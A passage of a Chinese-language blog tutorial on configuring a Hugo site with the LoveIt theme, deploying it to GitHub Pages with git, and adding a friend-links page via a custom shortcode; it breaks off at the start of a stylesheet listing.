</span></span><span class="line"><span class="cl">      <span class="c"># Commento comment 评论系统设置 (https://commento.io/)</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">comment</span><span class="p">.</span><span class="nx">commento</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">enable</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="c"># Utterances comment config (https://utteranc.es/)</span>
</span></span><span class="line"><span class="cl">      <span class="c"># Utterances comment 评论系统设置 (https://utteranc.es/)</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">comment</span><span class="p">.</span><span class="nx">utterances</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">enable</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">        <span class="c"># owner/repo</span>
</span></span><span class="line"><span class="cl">        <span class="nx">repo</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">issueTerm</span> <span class="p">=</span> <span class="s2">&#34;pathname&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">label</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">lightTheme</span> <span class="p">=</span> <span class="s2">&#34;github-light&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">darkTheme</span> <span class="p">=</span> <span class="s2">&#34;github-dark&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c"># Third-party library config</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 第三方库配置</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">library</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">library</span><span class="p">.</span><span class="nx">css</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="c"># someCSS = &#34;some.css&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># located in &#34;assets/&#34; 位于 &#34;assets/&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># Or 或者</span>
</span></span><span class="line"><span class="cl">        <span class="c"># someCSS = &#34;https://cdn.example.com/some.css&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">library</span><span class="p">.</span><span class="nx">js</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="c"># someJavascript = &#34;some.js&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># located in &#34;assets/&#34; 位于 &#34;assets/&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># Or 或者</span>
</span></span><span class="line"><span class="cl">        <span class="c"># someJavascript = &#34;https://cdn.example.com/some.js&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c"># Page SEO config</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 页面 SEO 配置</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">seo</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="c"># image URL</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 图片 URL</span>
</span></span><span class="line"><span class="cl">      <span class="nx">images</span> <span class="p">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">      <span class="c"># Publisher info</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 出版者信息</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">seo</span><span class="p">.</span><span class="nx">publisher</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span> <span class="p">=</span> <span class="s2">&#34;xxxx&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">logoUrl</span> <span class="p">=</span> <span class="s2">&#34;/images/avatar.png&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c"># TypeIt config</span>
</span></span><span class="line"><span class="cl">  <span class="c"># TypeIt 配置</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">typeit</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c"># typing speed between each step (measured in milliseconds)</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 每一步的打字速度 (单位是毫秒)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">speed</span> <span class="p">=</span> <span class="mi">100</span>
</span></span><span class="line"><span class="cl">    <span class="c"># blinking speed of the cursor (measured in milliseconds)</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 光标的闪烁速度 (单位是毫秒)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">cursorSpeed</span> <span class="p">=</span> <span class="mi">1000</span>
</span></span><span class="line"><span class="cl">    <span class="c"># character used for the cursor (HTML format is supported)</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 光标的字符 (支持 HTML 格式)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">cursorChar</span> <span class="p">=</span> <span class="s2">&#34;|&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c"># cursor duration after typing finishing (measured in milliseconds, &#34;-1&#34; means unlimited)</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 打字结束之后光标的持续时间 (单位是毫秒, &#34;-1&#34; 代表无限大)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">duration</span> <span class="p">=</span> <span class="mi">-1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c"># Site verification code for Google/Bing/Yandex/Pinterest/Baidu</span>
</span></span><span class="line"><span class="cl">  <span class="c"># 网站验证代码，用于 Google/Bing/Yandex/Pinterest/Baidu</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">verification</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nx">google</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">bing</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">yandex</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">pinterest</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">baidu</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c"># Site SEO config</span>
</span></span><span class="line"><span class="cl">  <span class="c"># 网站 SEO 配置</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">seo</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c"># image URL</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 图片 URL</span>
</span></span><span class="line"><span class="cl">    <span class="nx">image</span> <span class="p">=</span> <span class="s2">&#34;/images/Apple-Devices-Preview.png&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c"># thumbnail URL</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 缩略图 URL</span>
</span></span><span class="line"><span class="cl">    <span class="nx">thumbnailUrl</span> <span class="p">=</span> <span class="s2">&#34;/images/screenshot.png&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c"># Analytics config</span>
</span></span><span class="line"><span class="cl">  <span class="c"># 网站分析配置</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">analytics</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nx">enable</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">    <span class="c"># Google Analytics</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">analytics</span><span class="p">.</span><span class="nx">google</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="nx">id</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># whether to anonymize IP</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 是否匿名化用户 IP</span>
</span></span><span class="line"><span class="cl">      <span class="nx">anonymizeIP</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="c"># Fathom Analytics</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">analytics</span><span class="p">.</span><span class="nx">fathom</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="nx">id</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># server url for your tracker if you&#39;re self hosting</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 自行托管追踪器时的主机路径</span>
</span></span><span class="line"><span class="cl">      <span class="nx">server</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c"># Cookie consent config</span>
</span></span><span class="line"><span class="cl">  <span class="c"># Cookie 许可配置</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">cookieconsent</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nx">enable</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">    <span class="c"># text strings used for Cookie consent banner</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 用于 Cookie 许可横幅的文本字符串</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">cookieconsent</span><span class="p">.</span><span class="nx">content</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="nx">message</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="nx">dismiss</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="nx">link</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c"># CDN config for third-party library files</span>
</span></span><span class="line"><span class="cl">  <span class="c"># 第三方库文件的 CDN 设置</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">cdn</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c"># CDN data file name, disabled by default</span>
</span></span><span class="line"><span class="cl">    <span class="c"># (&#34;jsdelivr.yml&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="c"># located in &#34;themes/LoveIt/assets/data/cdn/&#34; directory</span>
</span></span><span class="line"><span class="cl">    <span class="c"># you can store your own data files in the same path under your project:</span>
</span></span><span class="line"><span class="cl">    <span class="c"># &#34;assets/data/cdn/&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c"># CDN 数据文件名称, 默认不启用</span>
</span></span><span class="line"><span class="cl">    <span class="c"># (&#34;jsdelivr.yml&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 位于 &#34;themes/LoveIt/assets/data/cdn/&#34; 目录</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 可以在你的项目下相同路径存放你自己的数据文件:</span>
</span></span><span class="line"><span class="cl">    <span class="c"># &#34;assets/data/cdn/&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span> <span class="p">=</span> <span class="s2">&#34;jsdelivr.yml&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c"># Compatibility config</span>
</span></span><span class="line"><span class="cl">  <span class="c"># 兼容性设置</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">compatibility</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c"># whether to use Polyfill.io to be compatible with older browsers</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 是否使用 Polyfill.io 来兼容旧式浏览器</span>
</span></span><span class="line"><span class="cl">    <span class="nx">polyfill</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">    <span class="c"># whether to use object-fit-images to be compatible with older browsers</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 是否使用 object-fit-images 来兼容旧式浏览器</span>
</span></span><span class="line"><span class="cl">    <span class="nx">objectFit</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Markup related configuration in Hugo</span>
</span></span><span class="line"><span class="cl"><span class="c"># Hugo 解析文档的配置</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">markup</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="c"># Syntax Highlighting (https://gohugo.io/content-management/syntax-highlighting)</span>
</span></span><span class="line"><span class="cl">  <span class="c"># 语法高亮设置 (https://gohugo.io/content-management/syntax-highlighting)</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">markup</span><span class="p">.</span><span class="nx">highlight</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nx">codeFences</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="nx">guessSyntax</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="nx">lineNos</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="nx">lineNumbersInTable</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="c"># false is a necessary configuration (https://github.com/dillonzq/LoveIt/issues/158)</span>
</span></span><span class="line"><span class="cl">    <span class="c"># false 是必要的设置 (https://github.com/dillonzq/LoveIt/issues/158)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">noClasses</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">  <span class="c"># Goldmark is from Hugo 0.60 the default library used for Markdown</span>
</span></span><span class="line"><span class="cl">  <span class="c"># Goldmark 是 Hugo 0.60 以来的默认 Markdown 解析库</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">markup</span><span class="p">.</span><span class="nx">goldmark</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">markup</span><span class="p">.</span><span class="nx">goldmark</span><span class="p">.</span><span class="nx">extensions</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="nx">definitionList</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="nx">footnote</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="nx">linkify</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="nx">strikethrough</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="nx">table</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="nx">taskList</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="nx">typographer</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">markup</span><span class="p">.</span><span class="nx">goldmark</span><span class="p">.</span><span class="nx">renderer</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="c"># whether to use HTML tags directly in the document</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 是否在文档中直接使用 HTML 标签</span>
</span></span><span class="line"><span class="cl">      <span class="nx">unsafe</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">  <span class="c"># Table Of Contents settings</span>
</span></span><span class="line"><span class="cl">  <span class="c"># 目录设置</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">markup</span><span class="p">.</span><span class="nx">tableOfContents</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nx">startLevel</span> <span class="p">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="nx">endLevel</span> <span class="p">=</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Author config</span>
</span></span><span class="line"><span class="cl"><span class="c"># 作者配置</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">author</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span> <span class="p">=</span> <span class="s2">&#34;cnitlrt&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="nx">email</span> <span class="p">=</span> <span class="s2">&#34;cnitlrt@gmail.com&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="nx">link</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Sitemap config</span>
</span></span><span class="line"><span class="cl"><span class="c"># 网站地图配置</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">sitemap</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="nx">changefreq</span> <span class="p">=</span> <span class="s2">&#34;weekly&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="nx">filename</span> <span class="p">=</span> <span class="s2">&#34;sitemap.xml&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="nx">priority</span> <span class="p">=</span> <span class="mf">0.5</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Permalinks config (https://gohugo.io/content-management/urls/#permalinks)</span>
</span></span><span class="line"><span class="cl"><span class="c"># Permalinks 配置 (https://gohugo.io/content-management/urls/#permalinks)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">Permalinks</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="c"># posts = &#34;:year/:month/:filename&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="nx">posts</span> <span class="p">=</span> <span class="s2">&#34;:filename&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Privacy config (https://gohugo.io/about/hugo-and-gdpr/)</span>
</span></span><span class="line"><span class="cl"><span class="c"># 隐私信息配置 (https://gohugo.io/about/hugo-and-gdpr/)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">privacy</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="c"># privacy of the Google Analytics (replaced by params.analytics.google)</span>
</span></span><span class="line"><span class="cl">  <span class="c"># Google Analytics 相关隐私 (被 params.analytics.google 替代)</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">privacy</span><span class="p">.</span><span class="nx">googleAnalytics</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c"># ...</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">privacy</span><span class="p">.</span><span class="nx">twitter</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nx">enableDNT</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">privacy</span><span class="p">.</span><span class="nx">youtube</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nx">privacyEnhanced</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Options to make output .md files</span>
</span></span><span class="line"><span class="cl"><span class="c"># 用于输出 Markdown 格式文档的设置</span>
</span></span><span class="line"><span class="cl"><span class="c"># [mediaTypes]</span>
</span></span><span class="line"><span class="cl"><span class="c">#   [mediaTypes.&#34;text/plain&#34;]</span>
</span></span><span class="line"><span class="cl"><span class="c">#     suffixes = [&#34;md&#34;]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># # Options to make output .md files</span>
</span></span><span class="line"><span class="cl"><span class="c"># # 用于输出 Markdown 格式文档的设置</span>
</span></span><span class="line"><span class="cl"><span class="c"># [outputFormats.MarkDown]</span>
</span></span><span class="line"><span class="cl"><span class="c">#   mediaType = &#34;text/plain&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c">#   isPlainText = false</span>
</span></span><span class="line"><span class="cl"><span class="c">#   isHTML = true</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># # Options to make hugo output files</span>
</span></span><span class="line"><span class="cl"><span class="c"># # 用于 Hugo 输出文档的设置</span>
</span></span><span class="line"><span class="cl"><span class="c"># [outputs]</span>
</span></span><span class="line"><span class="cl"><span class="c">#   home = [&#34;HTML&#34;, &#34;RSS&#34;, &#34;JSON&#34;]</span>
</span></span><span class="line"><span class="cl"><span class="c">#   page = [&#34;HTML&#34;, &#34;MarkDown&#34;]</span>
</span></span><span class="line"><span class="cl"><span class="c">#   section = [&#34;HTML&#34;, &#34;RSS&#34;]</span>
</span></span><span class="line"><span class="cl"><span class="c">#   taxonomy = [&#34;HTML&#34;, &#34;RSS&#34;]</span>
</span></span><span class="line"><span class="cl"><span class="c">#   taxonomyTerm = [&#34;HTML&#34;]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>hugo server -D</p>
<p>访问http://127.0.0.1:1313/</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230128022049918.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230128022049918.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230128022049918.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230128022049918.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230128022049918.png"
        title="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230128022049918.png" /></p>
<p>上传github</p>
<p>在blog目录下运行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hugo
</span></span></code></pre></td></tr></table>
</div>
</div><p>会生成public目录</p>
<p>创建一个空白目录(例如cnitlrt)，在public目录下运行下面的指令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git init
</span></span><span class="line"><span class="cl">git add .
</span></span><span class="line"><span class="cl">git branch -M master <span class="c1">#创建master的分支</span>
</span></span><span class="line"><span class="cl">git remote add origin git@github.com:cnitlrt/cnitlrt.github.io.git
</span></span><span class="line"><span class="cl">git push -u origin master
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git add . &amp;&amp; git commit -m &#34;test&#34; &amp;&amp; git remote rm origin &amp;&amp; git remote add origin git@github.com:cnitlrt/cnitlrt.github.io.git &amp;&amp; git push -u origin master
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="增加友链-所有的目录都在根目录">增加友链 （所有的目录都在根目录）</h4>
<h5 id="增加菜单栏configtoml">增加菜单栏（config.toml）</h5>
<pre><code>  [[languages.zh-cn.menu.main]]
    identifier = &quot;friend&quot;
    pre = &quot;&quot;
    post = &quot;&quot;
    name = &quot;友链&quot;
    url = &quot;/friend/&quot;
    title = &quot;&quot;
    weight = 7    
</code></pre>
<h5 id="创建html-xxxbloglayoutsshortcodes-创建friendhtml">创建html (xxx/blog/layouts/shortcodes/) 创建friend.html</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-htm" data-lang="htm"><span class="line"><span class="cl">{{ if .IsNamedParams }}
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;_blank&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">{{</span> <span class="err">.</span><span class="na">Get</span> <span class="err">&#34;</span><span class="na">url</span><span class="err">&#34;</span> <span class="err">}}</span> <span class="na">title</span><span class="o">=</span><span class="s">{{</span> <span class="err">.</span><span class="na">Get</span> <span class="err">&#34;</span><span class="na">name</span><span class="err">&#34;</span> <span class="err">}}</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;friendurl&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;frienddiv&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;frienddivleft&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">img</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;myfriend&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">{{</span> <span class="err">.</span><span class="na">Get</span> <span class="err">&#34;</span><span class="na">logo</span><span class="err">&#34;</span> <span class="err">}}</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;frienddivright&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;friendname&#34;</span><span class="p">&gt;</span>{{ .Get &#34;name&#34; }}<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;friendinfo&#34;</span><span class="p">&gt;</span>{{ .Get &#34;word&#34; }}<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">{{ end }}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="css代码-assetscss_partial_signal新建_friendscss">css代码 (<code>assets/css/_partial/_signal</code>新建<code>_friend.scss</code>)</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
